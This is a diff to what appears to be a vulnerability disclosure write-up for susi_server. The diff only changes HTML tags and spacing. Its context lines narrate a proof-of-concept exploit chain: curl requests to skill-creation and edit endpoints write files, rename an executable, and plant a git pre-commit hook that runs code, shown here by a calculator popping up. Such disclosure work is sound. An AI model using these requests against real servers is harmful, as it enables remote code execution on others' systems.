@@ -34,9 +34,9 @@ Here's an outline of what I'm going to show:
 </video>
 
 #### Video Transcript/Description:
-<p id="video-short-transcript">
+<div id="video-short-transcript">
 The execution of the attack commands is shown in rapid succession, ending with a calculator that pops up.
-</p>
+</div>
 
 # Setup Instructions
 ## Requirements
@@ -268,10 +268,9 @@ After about 60 seconds a calc pops up.
 </video>
 
 #### Video Transcript - Detailed Explanation:
-<p id="video-transcript">
+<div id="video-transcript" markdown="1">
 
 1. In a terminal `bin/start.sh` is executed inside the `susi_server` folder to start the server.
-
 2. In a terminal the following command is executed:
    ```bash
    curl -X POST -F 'access_token=[YOUR_ACCESS_TOKEN]' -F 'model=general' \
@@ -279,9 +278,7 @@ After about 60 seconds a calc pops up.
    -F 'image=' -F 'image_name=owned' 'http://localhost:4000/cms/createSkill.json'
    ```
    This creates the file `susi_skill_data/models/general/Knowledge/en/whois.txt` (`susi_skill_data` is a sibling directory of `susi_server`) with the content `OWNED`.
-
 3. A file manager is opened which shows the existence of the `susi_skill_data/models/general/Knowledge/en/whois.txt` file and also the `susi_skill_data/models/general/Knowledge/en/images/owned` file.
-
 4. In a terminal the following command is executed:
    ```bash
    `curl -X POST -F 'access_token=[YOUR_ACCESS_TOKEN]' -F 'imageChanged=false' \
@@ -294,7 +291,6 @@ After about 60 seconds a calc pops up.
    ```
    This will change the content of the `whois` skill file from `OWNED` to `ANYTHING`.
    The file `susi_server/src/org/json/JSONException.java` (this file is executable) is renamed to `susi_skill_data/models/general/Knowledge/en/pre-commit.txt`.
-
 5. In a terminal the following command is executed:
    ```bash
    curl -X POST -F 'access_token=[YOUR_ACCESS_TOKEN]' -F 'imageChanged=false' \
@@ -310,4 +306,4 @@ After about 60 seconds a calc pops up.
 6. A file manager is opened which shows the existence of the `susi_skill_data/.git/hooks/pre-commit` file.
 7. The changes are now automatically commited by `susi_server`.
 This triggers the malicious pre-commit hook we just created. A calculator that pops up can be seen.
-</p>
+</div>
